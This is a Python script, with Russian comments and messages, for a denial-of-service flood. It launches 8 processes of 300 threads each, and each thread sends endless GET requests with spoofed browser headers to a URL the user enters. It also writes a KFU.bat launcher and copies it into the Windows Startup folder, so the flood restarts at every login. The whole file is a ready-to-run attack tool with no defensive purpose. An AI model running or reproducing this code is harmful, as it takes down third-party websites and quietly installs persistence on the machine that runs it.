import multiprocessing
import threading
import requests
import time
from fake_headers import Headers
import os
import shutil
import getpass

def request(target):
    while True:
        try:
            a=Headers()
            headers=a.generate()
            res = requests.get(target, headers=headers)
            print("Запрос отправлен!")
        except requests.exceptions.ConnectionError:
            print("Ошибка соединения!")

def start_threads(target_url, thread_count):

    for i in range(thread_count):
        thread = threading.Thread(target=request, args=(target_url,))
        thread.start()
        print(f"{i + 1} поток запущен!")

def start_processes(target_url, process_count, thread_count):
    for i in range(process_count):
        process = multiprocessing.Process(target=start_threads, args=(target_url, thread_count))
        process.start()
        print(f"{i + 1} процесс запущен!")
def create_bat_file():
    # Создаем BAT файл в текущей директории
    bat_filename = 'KFU.bat'
    bat_content = """@echo off
    cd /d %~dp0
    python "{}"
    """.format(os.path.abspath(__file__))

    with open(bat_filename, 'w') as bat_file:
        bat_file.write(bat_content)
    print(f"BAT файл {bat_filename} был создан в текущей директории.")


def add_bat_to_startup():
    # Определяем путь к папке автозагрузки
    username = getpass.getuser()
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Путь к BAT файлу
    bat_filename = 'KFU.bat'  # Имя bat файла
    bat_source_path = os.path.join(os.getcwd(), bat_filename)  # Путь к bat файлу в текущей директории
    bat_dest_path = os.path.join(startup_path, bat_filename)  # Путь к папке автозагрузки

    # Проверяем, есть ли уже bat файл в папке автозагрузки
    if not os.path.exists(bat_dest_path):
        # Если bat файл не найден, копируем его в папку автозагрузки
        if os.path.exists(bat_source_path):
            shutil.copy(bat_source_path, bat_dest_path)
            print(f"Файл {bat_filename} был перемещен в папку автозагрузки.")
        else:
            print(f"Ошибка: Файл {bat_filename} не найден в текущей директории.")
    else:
        print(f"Файл {bat_filename} уже существует в папке автозагрузки.")


if __name__ == "__main__":
    # Создаем BAT файл
    create_bat_file()
    # Запускаем добавление BAT файла в автозагрузку
    add_bat_to_startup()

    url = input("Введите URL: ")
    process_count = 8 # Количество процессов
    thread_count = 300  # Количество потоков на процесс
    start_processes(url, process_count, thread_count)
